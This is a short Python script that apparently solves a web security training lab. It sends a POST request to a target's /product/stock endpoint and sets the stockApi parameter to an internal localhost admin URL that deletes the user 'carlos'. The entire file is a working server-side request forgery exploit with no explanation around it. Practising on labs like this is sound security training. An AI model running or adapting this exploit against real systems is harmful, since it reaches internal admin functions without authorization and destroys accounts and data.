import requests
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]+'/product/stock'

burp_headers = {}
burp_data = {"stockApi": "http://localhost/admin/delete?username=carlos"}
requests.post(burp_url, headers=burp_headers, data=burp_data)
